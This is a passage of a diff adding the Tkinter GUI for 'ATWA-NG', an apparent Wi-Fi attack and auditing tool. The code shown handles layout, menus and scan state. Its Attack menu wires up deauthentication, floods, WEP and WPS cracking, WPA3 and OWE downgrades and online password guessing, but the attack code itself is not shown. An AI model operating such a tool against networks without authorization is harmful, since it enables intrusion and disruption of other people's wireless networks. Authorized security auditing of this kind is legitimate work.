@@ -1,0 +1,3538 @@
+"""ATWA-NG GUI — Tkinter, wired to this project's own native attack
+functions throughout (never subprocess-wraps an attack tool; John/
+hcxpcapngtool/pcapfix/mergecap are generic file-format utilities, not
+attack logic).
+
+Design constraint driving the layout: a toolbar of many buttons in a
+single `pack(side=LEFT)` row with no wrap and no menu fallback means
+buttons past the window edge become inaccessible when narrowed. Every
+action here is reachable from a real `tk.Menu` menu bar (native window
+chrome — cannot be clipped by resizing, unlike a packed Frame), with
+the toolbar reduced to a few essential, low-count controls so it's
+unlikely to overflow even on its own.
+"""
+
+from __future__ import annotations
+
+import functools
+import queue
+import threading
+import tkinter as tk
+from pathlib import Path
+from tkinter import filedialog, messagebox, ttk
+from typing import TYPE_CHECKING
+
+from .. import __version__
+from ..scan import AccessPoint
+from . import theme as theme_mod
+from .widgets import SignalGraph
+
+if TYPE_CHECKING:
+    from .attack_runner import AttackRunner
+
+TARGET_COLUMNS = (
+    ("bssid", "BSSID", 165),
+    ("ssid", "SSID", 220),
+    ("channel", "CH", 45),
+    ("security", "Security", 100),
+    ("pmf", "PMF", 90),
+    ("wps", "WPS", 75),
+    ("signal", "Signal", 75),
+)
+# Column that absorbs leftover width instead of every column staying a
+# fixed drag-only size (2026-08-28 user report: SSID text truncating while
+# other columns sat on wasted space).
+TARGET_STRETCH_COLUMN = "ssid"
+
+CAPTURE_COLUMNS = (
+    ("name", "File", 220),
+    ("kind", "Kind", 90),
+    ("size", "Size", 80),
+    ("path", "Path", 420),
+)
+# Path is the column worth growing when there's slack width; the others
+# are already sized to their content (same reasoning as TARGET_STRETCH_COLUMN).
+CAPTURE_STRETCH_COLUMN = "path"
+
+# Channel-lock discipline: selecting a target auto-locks the adapter to
+# that target's channel so a background scan loop doesn't keep hopping
+# away from it mid-attack; auto-unlock after this many seconds of the
+# locked target going unseen, so a stale lock doesn't strand the radio
+# on a dead channel forever.
+CHANNEL_LOCK_TIMEOUT = 30.0
+
+
+class App:
+    def __init__(self, root: tk.Tk, demo: bool = False):
+        self.root = root
+        self.root.title(f"ATWA-NG — {__version__}")
+        # Default to 1320x780, but never larger than the actual screen and
+        # centered on it -- a hardcoded size bigger than the display (small
+        # laptops, netbooks, anyone without a full-HD-or-larger monitor)
+        # opened off-screen/clipped on first launch.
+        screen_w, screen_h = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
+        win_w, win_h = min(1380, int(screen_w * 0.95)), min(860, int(screen_h * 0.92))
+        self.root.geometry(f"{win_w}x{win_h}+{(screen_w - win_w) // 2}+{(screen_h - win_h) // 2}")
+        self.root.minsize(min(760, win_w), min(560, win_h))
+        self._set_window_icon()
+
+        self.fonts = theme_mod.apply(root)
+        self.THEME = theme_mod.THEME
+        # White outline around the whole window (v1 reference look) -- Tk's
+        # highlight ring is the only way to get a colored border on a
+        # top-level window itself, as opposed to individual widgets.
+        self.root.configure(highlightthickness=2, highlightbackground=self.THEME["border"],
+                             highlightcolor=self.THEME["border"])
+
+        self._queue: queue.Queue = queue.Queue()
+        self._queue_coalesce_lock = threading.Lock()
+        self._scan_update_queued = False
+        self._pending_signal_sample: int | None = None
+        self._signal_sample_queued = False
+        self._busy = False
+        self._captures_refreshing = False
+        self.capture_buttons: list[ttk.Button] = []
+        self._scanning = threading.Event()
+        # Generation token for the scan loop: a fast Stop -> Start would
+        # otherwise let the OLD loop thread (still mid-hop dwell when the
+        # flag got cleared) see _scanning set again and keep running --
+        # two loops, two sniffers, two hoppers fighting one radio.
+        # _stop_scan bumps this; a stale-generation loop exits at its next
+        # iteration check.
+        self._scan_generation = 0
+        self._stop_event = threading.Event()
+        self._auto_deauth_thread: threading.Thread | None = None
+        self._auto_deauth_client: str | None = None
+        self._scan_thread: threading.Thread | None = None
+        # Default no-op; _run_bg() replaces this with a real self._log-backed
+        # callback for the duration of each attack it launches. Set here too
+        # so callers that bypass _run_bg (auto-deauth, PINCER's own thread
+        # setup before _run_bg's fn actually starts) never hit an
+        # AttributeError referencing self._progress_fn before any attack
+        # has run yet.
+        self._progress_fn = lambda msg: None
+
+        self.aps: dict[str, AccessPoint] = {}
+        self.selected_bssid: str | None = None
+        self._last_graphed_bssid: str | None = None
+        self._select_capture_watch_stop: threading.Event | None = None
+        self._lock_capture_proc = None  # lock_capture.LockCapture | None
+        self._crack_proc_holder: dict = {}  # {"proc": subprocess.Popen} while a crack runs
+        self.mon_iface: str | None = None
+        self.own_mac: str | None = None
+        self._permanent_mac: str | None = None  # set aside while MAC is randomized, for restore
+        self.alfa_pair: tuple[str, str] | None = None  # (scan_iface, attack_iface) once detected
+
+        from .settings import Settings
+
+        self.settings = Settings()
+
+        # Channel lock state — see CHANNEL_LOCK_TIMEOUT above.
+        self.channel_locked = False
+        self.locked_bssid: str | None = None
+        self.locked_channel: int | None = None
+        self._scan_channels: list[int] | None = None  # None = hop all; [ch] = locked
+        self._lock_lost_since: float | None = None
+
+        self.adapter_var = tk.StringVar()
+        self.adapter_display_var = tk.StringVar()  # combobox text: "wlan1 (Mediatek)"; adapter_var stays the bare iface
+        self.iface_ap_var = tk.StringVar(value=self.settings.get("iface_ap", ""))
+        self.iface_ap_display_var = tk.StringVar()
+        self._iface_display_to_name: dict[str, str] = {}
+        self._iface_short_display: dict[str, str] = {}
+        self.mac_var = tk.StringVar(value="")
+        self.adapter_mac_var = tk.StringVar(value="")  # selected adapter's MAC, shown next to the combo -- see _refresh_adapters
+        self.monitor_status_var = tk.StringVar(value="MONITOR: OFF")
+        self.channel_lock_var = tk.StringVar(value="Scanning all channels")
+        self.wordlist_var = tk.StringVar(value=self.settings.get("wordlist", ""))
+        self.john_rules_var = tk.StringVar(value=self.settings.get("john_rules", ""))
+        self.capture_dir_var = tk.StringVar()
+        self.status_var = tk.StringVar(value="Ready.")
+        self.randomize_mac_var = tk.BooleanVar(value=self.settings.get("randomize_mac", True))
+
+        from ..storage import capture_root
+
+        self.capture_dir_var.set(self.settings.get("capture_dir") or str(capture_root()))
+
+        self._build_menubar()
+        self._build_toolbar()
+        # Outline separating the toolbar from the body below it (2026-08-27
+        # user report: "top bar needs an outline separating bar from window").
+        ttk.Separator(self.root, orient=tk.HORIZONTAL).pack(side=tk.TOP, fill=tk.X)
+        self._build_body()
+        self._build_status_bar()
+
+        self._sort_col = self.settings.get("sort_col")
+        self._sort_reverse = self.settings.get("sort_reverse", False)
+        self.security_filter_var.set(self.settings.get("security_filter", "All"))
+
+        self._refresh_adapters()
+        saved_adapter = self.settings.get("adapter")
+        if saved_adapter and saved_adapter in self._iface_display_to_name.values():
+            self.adapter_var.set(saved_adapter)
+            self._sync_iface_display(self.adapter_var, self.adapter_display_var)
+
+        self.root.after(100, self._drain_queue)
+        self.root.after(5000, self._check_channel_lock)
+        self.root.after(200, lambda: self._check_dependencies(startup=True))
+        # Advisory only: perform the GitHub check off the Tk thread and keep
+        # radio/startup behavior independent of network availability.
+        threading.Thread(target=self._check_for_updates, daemon=True).start()
+        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
+
+        if demo:
+            self._load_demo_data()
+
+    def _set_window_icon(self):
+        """Window/taskbar icon from the approved logo mark. Best-effort --
+        a missing/unreadable asset shouldn't block the GUI from launching."""
+        assets = Path(__file__).parent / "assets"
+        try:
+            images = [tk.PhotoImage(file=str(assets / f"icon_{size}.png")) for size in (16, 32, 64, 128, 256)]
+        except tk.TclError:
+            return
+        self._icon_images = images  # keep references -- Tk drops unreferenced PhotoImages
+        self.root.iconphoto(True, *images)
+
+    # ------------------------------------------------------------------
+    # Menu bar — the resize-clip fix. Native window chrome, always reachable.
+    # ------------------------------------------------------------------
+    def _build_menubar(self):
+        menubar = tk.Menu(self.root, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+
+        file_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+        file_menu.add_command(label="Set Capture Folder...", command=self._choose_capture_dir)
+        file_menu.add_command(label="Set Wordlist...", command=self._choose_wordlist)
+        file_menu.add_command(label="Set John Ruleset...", command=self._choose_john_rules)
+        file_menu.add_separator()
+        file_menu.add_command(label="Exit", command=self._on_close)
+        menubar.add_cascade(label="File", menu=file_menu)
+
+        scan_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+        scan_menu.add_command(label="Refresh Adapters", command=self._refresh_adapters)
+        scan_menu.add_command(label="Start Monitor Mode", command=self._start_monitor)
+        scan_menu.add_command(label="Stop Monitor Mode", command=self._stop_monitor)
+        scan_menu.add_checkbutton(label="Randomize MAC on Monitor Mode", variable=self.randomize_mac_var)
+        scan_menu.add_separator()
+        scan_menu.add_command(label="Start Scanning", command=self._start_scan)
+        scan_menu.add_command(label="Stop Scanning", command=self._stop_scan)
+        scan_menu.add_separator()
+        scan_menu.add_command(label="Unlock Channel (resume hopping)", command=self._unlock_channel)
+        scan_menu.add_command(label="WPS Scan...", command=self._open_wps_scan)
+        menubar.add_cascade(label="Scan", menu=scan_menu)
+
+        attack_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+        attack_menu.add_command(label="Deauth All Clients", command=self._attack_deauth_all)
+        attack_menu.add_command(label="Deauth Selected Client", command=self._attack_deauth_client)
+        attack_menu.add_command(label="PMKID Attack (Clientless)", command=self._attack_pmkid)
+        attack_menu.add_command(label="Handshake Capture", command=self._attack_handshake)
+        attack_menu.add_separator()
+        attack_menu.add_command(label="CSA Spoof (channel redirect)", command=self._attack_csa_spoof)
+        attack_menu.add_command(label="EAPOL-Start Flood", command=self._attack_eapol_flood)
+        attack_menu.add_command(label="Auth Flood", command=self._attack_auth_flood)
+        attack_menu.add_command(label="Beacon Flood", command=self._attack_beacon_flood)
+        attack_menu.add_command(label="TKIP MIC Flood", command=self._attack_tkip_mic_flood)
+        attack_menu.add_separator()
+        attack_menu.add_command(label="Smart Attack (Auto)", command=self._attack_smart)
+        attack_menu.add_command(label="OMNI Attack (All Stages)", command=self._attack_omni)
+        attack_menu.add_command(label="WEP Attack", command=self._attack_wep)
+        attack_menu.add_command(label="WEP Caffe Latte (client)", command=self._attack_caffe_latte)
+        attack_menu.add_command(label="WEP Hirte (IBSS client)", command=self._attack_hirte)
+        attack_menu.add_command(label="WEP Chopchop (decrypt)", command=self._attack_chopchop)
+        attack_menu.add_command(label="WPS Null-PIN", command=self._attack_wps_null_pin)
+        attack_menu.add_command(label="WPS Pixie-Dust (offline)", command=self._attack_wps_pixie)
+        attack_menu.add_command(label="WPS Bruteforce (experimental)", command=self._attack_wps_bruteforce)
+        attack_menu.add_command(label="Downgrade Twin (WPA3-transition, portal-free)", command=self._attack_downgrade_twin)
+        attack_menu.add_command(label="PMF Bypass Reconnect (portal-free)", command=self._attack_pmf_bypass)
+        attack_menu.add_command(label="OWE Downgrade (open-transition, portal-free)", command=self._attack_owe_downgrade)
+        attack_menu.add_command(label="Online Password Guess (live, budgeted)", command=self._attack_online_guess)
+        attack_menu.add_command(label="🩸 Dragonblood (SAE timing side-channel, unverified)",
+                                 command=self._attack_dragonblood, foreground=self.THEME["error"])
+        attack_menu.add_separator()
+        attack_menu.add_command(
+            label="⚡ PINCER (Dual-Alfa)", command=self._attack_pincer, state=tk.DISABLED,
+        )
+        self.pincer_menu_index = attack_menu.index(tk.END)
+        attack_menu.add_separator()
+        attack_menu.add_command(label="Stop Attack", command=self._stop_attack)
+        menubar.add_cascade(label="Attack", menu=attack_menu)
+        self.attack_menu = attack_menu
+
+        cap_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+        cap_menu.add_command(label="Refresh Captures", command=self._refresh_captures)
+        cap_menu.add_command(label="Inspect Selected", command=self._capture_inspect)
+        cap_menu.add_command(label="Inspect All", command=self._capture_inspect_all)
+        cap_menu.add_command(label="Convert to 22000", command=self._capture_convert)
+        cap_menu.add_command(label="Fix Capture", command=self._capture_fix)
+        cap_menu.add_command(label="Merge Selected", command=self._capture_merge)
+        cap_menu.add_command(label="Crack Selected", command=self._capture_crack)
+        cap_menu.add_command(label="Copy Path", command=self._capture_copy_path)
+        cap_menu.add_separator()
+        cap_menu.add_command(label="Benchmark John", command=self._capture_benchmark_john)
+        cap_menu.add_command(label="Cleanup Handshakes...", command=self._capture_cleanup)
+        menubar.add_cascade(label="Captures", menu=cap_menu)
+
+        help_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+        help_menu.add_command(label="Check Dependencies", command=self._check_dependencies)
+        help_menu.add_command(label="About", command=self._show_about)
+        menubar.add_cascade(label="Help", menu=help_menu)
+
+        # Plain tagline text after Help, not a real cascade -- state=DISABLED
+        # keeps it non-clickable. Leading spaces push it rightward (native
+        # tk.Menu has no pack/place-style alignment option, so padding the
+        # label is the standard workaround) -- 2026-08-27 user request.
+        menubar.add_command(label=" " * 40 + "Airwave Teardown Wireless Auditing-NG", state=tk.DISABLED)
+
+        self.root.config(menu=menubar)
+
+    # ------------------------------------------------------------------
+    # Toolbar — deliberately minimal (few widgets => unlikely to overflow
+    # even on its own), authoritative access stays in the menu bar above.
+    # ------------------------------------------------------------------
+    def _build_toolbar(self):
+        # Toolbar items wrap onto as many rows as needed instead of
+        # overflowing off the visible window (2026-08-28 user report: a
+        # fixed single row clipped "Unlock" and pushed the logo button off
+        # entirely on screens under ~1400px). _reflow_toolbar reparents
+        # these widgets into fresh row frames on every resize based on
+        # actual measured width, so nothing is ever hidden -- only the
+        # toolbar's own height grows.
+        container = ttk.Frame(self.root, style="Toolbar.TFrame", padding=4)
+        container.pack(side=tk.TOP, fill=tk.X)
+
+        # Adapter/AP iface stacked in their own column (AP iface directly
+        # under Adapter, per user request) -- keeps the two interface
+        # pickers grouped and visually paired instead of strung out along
+        # one long row with the action buttons.
+        iface_col = ttk.Frame(container, style="Toolbar.TFrame")
+        ttk.Label(iface_col, text="Adapter:", style="Toolbar.TLabel").grid(row=0, column=0, sticky=tk.W)
+        # Chipset/vendor shown inside the dropdown itself ("wlan1
+        # (Mediatek)"), not as a separate always-on label (2026-08-27 user
+        # report, v1 reference has no such label) -- adapter_var still holds
+        # just the bare iface name for every downstream radio call.
+        self.adapter_combo = ttk.Combobox(iface_col, textvariable=self.adapter_display_var, state="readonly", width=20)
+        self.adapter_combo.grid(row=0, column=1, padx=(4, 0))
+        self.adapter_combo.bind("<<ComboboxSelected>>", lambda _e: self._on_adapter_selected())
+        # MAC shown as its own label, not embedded in the dropdown value --
+        # ttk.Combobox's popdown list width tracks the widget's own
+        # configured width, not its longest value, so a MAC-suffixed entry
+        # gets clipped in the dropdown itself (same real ttk limitation
+        # already worked around for the target filter combo below).
+        ttk.Label(iface_col, textvariable=self.adapter_mac_var, style="Muted.TLabel").grid(
+            row=0, column=2, sticky=tk.W, padx=(6, 0))
+        ttk.Label(iface_col, text="AP iface:", style="Toolbar.TLabel").grid(row=1, column=0, sticky=tk.W, pady=(2, 0))
+        self.iface_ap_combo = ttk.Combobox(iface_col, textvariable=self.iface_ap_display_var, state="readonly", width=20)
+        self.iface_ap_combo.grid(row=1, column=1, padx=(4, 0), pady=(2, 0))
+        self.iface_ap_combo.bind("<<ComboboxSelected>>", lambda _e: self._on_iface_ap_selected())
+
+        # MAC now shown in the Adapter dropdown itself (_iface_display),
+        # not a separate label here (2026-08-27 user request).
+        # Start Scanning / Stop Scan are two static buttons, not one
+        # toggling button, matching Start/Stop Monitor's pattern -- order
+        # per user request: Start Scanning, Stop Scan, Start Monitor,
+        # Stop Monitor, WPS Scan, Unlock.
+        self.scan_btn = ttk.Button(container, text="Start Scanning", command=self._start_scan, style="Toolbar.Accent.TButton")
+        stop_scan_btn = ttk.Button(container, text="Stop Scan", command=self._stop_scan, style="Toolbar.TButton")
+        start_mon_btn = ttk.Button(container, text="Start Monitor", command=self._start_monitor, style="Toolbar.TButton")
+        stop_mon_btn = ttk.Button(container, text="Stop Monitor", command=self._stop_monitor, style="Toolbar.TButton")
+        wps_btn = ttk.Button(container, text="WPS Scan", command=self._open_wps_scan, style="Toolbar.TButton")
+        unlock_btn = ttk.Button(container, text="Unlock", command=self._unlock_channel, style="Toolbar.TButton")
+        # No toolbar monitor-status pill (removed per 2026-08-27 user
+        # report -- monitor state still logs via _run_bg's own start/result
+        # lines and the status bar, just not as a standing toolbar widget).
+
+        self._toolbar_container = container
+        self._toolbar_items = [
+            iface_col, self.scan_btn, stop_scan_btn, start_mon_btn, stop_mon_btn, wps_btn, unlock_btn,
+        ]
+        self._toolbar_rows: list[ttk.Frame] = []
+        self._toolbar_reflow_width = -1
+        self._toolbar_reflowing = False
+        container.bind("<Configure>", self._reflow_toolbar)
+        self.root.after_idle(self._reflow_toolbar)
+
+    def _reflow_toolbar(self, _event=None):
+        # Re-entrancy guard: packing a new row frame into `container` fires
+        # another <Configure> on `container` itself, and winfo_reqwidth()
+        # below is enough to let Tk dispatch that queued event *during* this
+        # same call -- without the guard that recursive call tears down
+        # self._toolbar_rows mid-loop while the outer call is still packing
+        # into them ("bad window path name", reproduced live 2026-08-28).
+        if self._toolbar_reflowing:
+            return
+        container = self._toolbar_container
+        width = container.winfo_width()
+        if width <= 1 or width == self._toolbar_reflow_width:
+            return
+        self._toolbar_reflowing = True
+        try:
+            self._toolbar_reflow_width = width
+
+            for row in self._toolbar_rows:
+                row.destroy()
+            self._toolbar_rows = []
+            for item in self._toolbar_items:
+                item.pack_forget()
+                item.grid_forget()
+
+            # Group items into rows by measured width first, then grid each
+            # row's items with equal column weight so a short trailing row
+            # (e.g. just "Unlock" alone) stretches to fill the row instead
+            # of leaving a large blank gap (2026-08-28 user report: wrapping
+            # fixed the clipping but left "wasted empty spaces").
+            rows: list[list[tk.Widget]] = [[]]
+            used = 0
+            for item in self._toolbar_items:
+                req = item.winfo_reqwidth() + 8
+                if used + req > width and rows[-1]:
+                    rows.append([])
+                    used = 0
+                rows[-1].append(item)
+                used += req
+
+            for row_items in rows:
+                # Each row frame is a sibling of the toolbar items (all
+                # children of `container`), placed via -in rather than true
+                # reparenting. A freshly created sibling window stacks above
+                # its older siblings by default, so the row's own opaque
+                # background was painting straight over the already-existing
+                # buttons inside it ("packed successfully" per logging, but
+                # invisible on screen -- reproduced live 2026-08-28).
+                # lower() fixes the stacking order.
+                row = ttk.Frame(container, style="Toolbar.TFrame")
+                row.pack(side=tk.TOP, fill=tk.X)
+                row.lower()
+                self._toolbar_rows.append(row)
+                for col, item in enumerate(row_items):
+                    row.columnconfigure(col, weight=1)
+                    pad = (2, 10) if item is self._toolbar_items[0] else 4
+                    item.grid(in_=row, row=0, column=col, sticky="ew", padx=pad, pady=2)
+        finally:
+            self._toolbar_reflowing = False
+
+    # ------------------------------------------------------------------
+    # Body: PanedWindow(target tree | Notebook(Target tab, Captures tab)) + log
+    # ------------------------------------------------------------------
+    def _make_scrollable(self, parent) -> ttk.Frame:
+        """Canvas+Scrollbar wrapper — the Target tab's content (signal
+        graph + 10 attack buttons + auto-deauth row) is taller than fits
+        on a shorter window with no scroll path otherwise; real bug user
+        hit ("WPS Null-PIN barely visible", buttons below it unreachable).
+        Returns the inner frame to build content into."""
+        canvas = tk.Canvas(parent, bg=self.THEME["bg"], highlightthickness=0)
+        vsb = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=canvas.yview)
+        canvas.configure(yscrollcommand=vsb.set)
+        vsb.pack(side=tk.RIGHT, fill=tk.Y)
+        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+
+        inner = ttk.Frame(canvas)
+        window = canvas.create_window((0, 0), window=inner, anchor=tk.NW)
+
+        def on_inner_configure(_event=None):
+            canvas.configure(scrollregion=canvas.bbox("all"))
+
+        def on_canvas_configure(event):
+            canvas.itemconfig(window, width=event.width)
+
+        inner.bind("<Configure>", on_inner_configure)
+        canvas.bind("<Configure>", on_canvas_configure)
+
+        def on_wheel(event):
+            # event.num is set for X11's native Button-4/5 wheel events
+            # (event.delta is 0 on those); event.delta is set for the
+            # Windows/Mac-style MouseWheel event. Handle whichever this
+            # Tk build actually delivers rather than assuming one.
+            if event.num == 5 or event.delta < 0:
+                canvas.yview_scroll(1, "units")
+            elif event.num == 4 or event.delta > 0:
+                canvas.yview_scroll(-1, "units")
+
+        # Enter/Leave bound on the bare canvas only used to mean scrolling
+        # worked while hovering the canvas's own background pixels -- but
+        # `inner` (and everything packed into it: Target/Clients/graph/
+        # Attacks/Captures) sits ON TOP of the canvas covering nearly all
+        # of it, so the pointer left "the canvas" the instant it crossed
+        # onto any actual content, unbinding wheel scroll almost
+        # everywhere (2026-08-27 user report: scroll wasn't working on
+        # the right side). Bind directly on every descendant instead, once
+        # they all exist -- see _bind_wheel_recursive, called after this
+        # pane's content is built.
+        self._wheel_bind_target = (canvas, on_wheel)
+        return inner
+
+    def _bind_wheel_recursive(self, widget, on_wheel, skip=frozenset()):
+        """skip: widgets whose own subtree gets a dedicated scroller
+        instead (e.g. the Captures list, which needs to scroll itself,
+        not the outer page -- 2026-08-27 user report)."""
+        if widget in skip:
+            return
+        widget.bind("<MouseWheel>", on_wheel, add="+")
+        widget.bind("<Button-4>", on_wheel, add="+")
+        widget.bind("<Button-5>", on_wheel, add="+")
+        for child in widget.winfo_children():
+            self._bind_wheel_recursive(child, on_wheel, skip)
+
+    def _build_body(self):
+        # Top-level Notebook (Target tab | Captures tab) instead of one long
+        # silent-scroll column (2026-08-27 reskin) -- that single column
+        # buried Captures, and most of the Attacks list, below the fold with
+        # no visible cue there was more to see (2026-08-28 user report:
+        # "resizing makes hidden buttons appear that I was not aware of";
+        # Captures could shrink to nothing at normal window heights). Tabs
+        # give each one the *full* body height instead (2026-08-28 user
+        # request, citing v1/n2-ng's own tabbed raw-log precedent).
+        #
+        # The Scanned Access Points list lives INSIDE the Target tab, not
+        # beside the Notebook -- Captures work (managing/cracking files) has
+        # no use for it, so keeping it always-visible just stole width from
+        # the Captures button row/file table for no reason (2026-08-28 user
+        # request: "make the captures tab open all the way to the left to
+        # hide the scanned access points window"). It reappears automatically
+        # when the Target tab is reselected, since it's that tab's own child,
+        # not a separately-hidden widget.
+        #
+        # Log itself stays untabbed, always a full-width bottom strip (user
+        # live-test note 2026-08-27: moving IT into a notebook tab hid it).
+        body = ttk.Frame(self.root, padding=2)
+        body.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
+
+        notebook = ttk.Notebook(body)
+        notebook.pack(fill=tk.BOTH, expand=True)
+
+        target_tab = ttk.Frame(notebook)
+        notebook.add(target_tab, text="Target")
+        pane = ttk.PanedWindow(target_tab, orient=tk.HORIZONTAL)
+        pane.pack(fill=tk.BOTH, expand=True)
+
+        left = ttk.Frame(target_tab)
+        pane.add(left, weight=2)
+        self._build_target_tree(left)
+
+        right = ttk.Frame(target_tab)
+        pane.add(right, weight=3)
+        inner = self._make_scrollable(right)
+        self._build_target_panel(inner)
+        canvas, on_wheel = self._wheel_bind_target
+        self._bind_wheel_recursive(inner, on_wheel)
+        self._bind_wheel_recursive(canvas, on_wheel)
+
+        captures_tab = ttk.Frame(notebook)
+        notebook.add(captures_tab, text="Captures")
+        self.captures_box = ttk.LabelFrame(captures_tab, text="Captures")
+        self.captures_box.pack(fill=tk.BOTH, expand=True)
+        self._build_captures_panel(self.captures_box)
+
+        # Log stays a full-width bottom strip, always visible (user
+        # live-test note 2026-08-27: moving it into a notebook tab hid it).
+        self._build_log_pane(body)
+
+    def _build_target_tree(self, outer_parent):
+        # Boxed like every other section (Target/Clients/Attacks/Captures) --
+        # this was the one panel left as a bare frame with no border, which
+        # read as visually inconsistent (2026-08-27 user report: "needs more
+        # outlines to look visually organized").
+        # "Scanned Access Points" moved off the box border into this row,
+        # right next to Filter (2026-08-27 user request) -- the LabelFrame
+        # itself stays untitled, just the bordered outline.
+        box = ttk.Frame(outer_parent, style="Bordered.TFrame")
+        box.pack(fill=tk.BOTH, expand=True)
+        parent = ttk.Frame(box)
+        parent.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
+
+        filter_row = ttk.Frame(parent)
+        filter_row.pack(fill=tk.X, pady=(0, 4))
+        ttk.Label(filter_row, text="Scanned Access Points", style="Heading.TLabel").pack(side=tk.LEFT, padx=(0, 12))
+        ttk.Label(filter_row, text="Filter:").pack(side=tk.LEFT)
+        self.security_filter_var = tk.StringVar(value="All")
+        filter_combo = ttk.Combobox(
+            filter_row, textvariable=self.security_filter_var, state="readonly", width=14,
+            values=("All", "Open", "WEP", "WPA/WPA2", "WPA3", "Transition"),
+        )
+        filter_combo.pack(side=tk.LEFT, padx=6)
+        filter_combo.bind("<<ComboboxSelected>>", lambda _e: self._render_targets())
+        # MAC moved here (2026-08-27 user request): ttk.Combobox's popdown
+        # list width tracks the widget's own configured width, not its
+        # longest value, so the MAC-suffixed dropdown entries were getting
+        # clipped the same as the closed field -- a real ttk limitation,
+        # not fixable by a wider string. Plain text next to Filter instead.
+        ttk.Label(filter_row, textvariable=self.mac_var, style="Muted.TLabel").pack(side=tk.LEFT, padx=(12, 0))
+
+        # Separator between the filter controls and the results list
+        # (2026-08-27 user report: "the scan window needs separator lines").
+        ttk.Separator(parent, orient=tk.HORIZONTAL).pack(fill=tk.X, pady=(0, 4))
+
+        # Horizontal scrollbar packed into parent BEFORE tree_frame so it
+        # claims its strip at the bottom first — packing it after would
+        # leave it no space once tree_frame's fill=BOTH/expand=True already
+        # claimed everything.
+        hsb = ttk.Scrollbar(parent, orient=tk.HORIZONTAL)
+        hsb.pack(side=tk.BOTTOM, fill=tk.X)
+
+        tree_frame = ttk.Frame(parent)
+        tree_frame.pack(fill=tk.BOTH, expand=True)
+
+        cols = [c[0] for c in TARGET_COLUMNS]
+        self.tree = ttk.Treeview(tree_frame, columns=cols, show="headings", selectmode="browse")
+        for key, heading, width in TARGET_COLUMNS:
+            # No command= here -- click-to-sort is driven entirely by
+            # _on_tree_heading_press/_release below, alongside drag-to-
+            # reorder, so there's exactly one source of truth for what a
+            # heading press/release means instead of two competing ones.
+            self.tree.heading(key, text=heading)
+            # stretch=False on every column but TARGET_STRETCH_COLUMN: fixed
+            # columns keep whatever width the user drags them to instead of
+            # ttk auto-compressing them to fit the visible pane (2026-08-26
+            # live-test note: columns weren't comfortably resizable/reachable
+            # when narrower than total width) — but one column has to absorb
+            # slack width or it just sits wasted while SSID truncates
+            # (2026-08-28 user report).
+            self.tree.column(key, width=width, minwidth=40, stretch=(key == TARGET_STRETCH_COLUMN))
+        vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.tree.yview)
+        hsb.configure(command=self.tree.xview)
+        self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
+        self.tree.grid(row=0, column=0, sticky="nsew")
+        vsb.grid(row=0, column=1, sticky="ns")
+        tree_frame.rowconfigure(0, weight=1)
+        tree_frame.columnconfigure(0, weight=1)
+        self.tree.bind("<<TreeviewSelect>>", self._on_target_select)
+        self.tree.bind("<Double-1>", self._on_target_double_click)
+        self.tree.bind("<Button-3>", self._on_target_right_click)
+        # Column headings drive both click-to-sort AND drag-to-reorder from
+        # this one press/release pair (2026-09-08 user request for drag
+        # reordering) -- deliberately NOT ttk's built-in heading command=
+        # callback plus a separate drag binding, since the two would race:
+        # ttk fires its own heading command on release regardless of
+        # whether the press started there, so a real reorder-drag would
+        # ALSO trigger a sort on the origin column. One handler, one
+        # decision (same column released = click = sort; different column
+        # = drag = reorder), no double-firing possible.
+        self.tree.bind("<ButtonPress-1>", self._on_tree_heading_press, add="+")
+        self.tree.bind("<ButtonRelease-1>", self._on_tree_heading_release, add="+")
+        self._drag_press_col: str | None = None
+
+        # Wheel scroll over the whole box (Filter row, empty tree area),
+        # not just rows with content -- same reasoning as the right-side
+        # fix above (2026-08-27 user report: scroll wasn't reliable on
+        # either side).
+        def on_tree_wheel(event):
+            if event.num == 5 or event.delta < 0:
+                self.tree.yview_scroll(1, "units")
+            elif event.num == 4 or event.delta > 0:
+                self.tree.yview_scroll(-1, "units")
+        self._bind_wheel_recursive(box, on_tree_wheel)
+
+        self.hidden_columns: set[str] = set(self.settings.get("hidden_columns", []))
+        self.column_order: list[str] = list(self.settings.get("column_order", []))
+        self._apply_column_visibility()
+
+        # Row color by security (OPN/WEP/WPA/WPA2/WPA3).
+        self.tree.tag_configure("open", foreground="#888888")
+        self.tree.tag_configure("wep", foreground=self.THEME["error"])
+        self.tree.tag_configure("wpa", foreground=self.THEME["warn"])
+        self.tree.tag_configure("wpa2", foreground="#ffffff")
+        self.tree.tag_configure("wpa3", foreground=self.THEME["info"])
+        self.tree.tag_configure("transition", foreground="#cc88ff")
+        self.tree.tag_configure("owe", foreground="#ff9500")
+        self.tree.tag_configure("unknown", foreground=self.THEME["muted"])
+
+        # Subtle row banding so the target list reads as separated rows
+        # instead of one bunched block of text (2026-08-24 live-test note) —
+        # ttk.Treeview under "clam" has no simple per-cell gridline option,
+        # so alternating row background is the practical equivalent.
+        # 2026-08-27: moved to the lighter tree_bg/tree_band tokens so the
+        # list surface itself is visible against the window background.
+        self.tree.tag_configure("row_even", background=self.THEME["tree_bg"])
+        self.tree.tag_configure("row_odd", background=self.THEME["tree_band"])
+
+        self._sort_col: str | None = None
+        self._sort_reverse = False
+
+    def _build_target_panel(self, parent):
+        # Single column, bordered sections stacked top-to-bottom (2026-08-27
+        # reskin: v1's dense layout, no side-by-side split) -- parent is
+        # already a scrolling canvas (_make_scrollable), so there's no fixed
+        # height to budget for the way the old tabbed/two-column layout had to.
+        # Title and controls on separate rows: an unbounded-length SSID (up
+        # to 32 bytes) sharing a row with the lock pill/Unlock/Stop Attack
+        # buttons squeezed them together/overlapped (regression caught via
+        # screenshot during the 2026-08-27 reskin -- same issue this layout
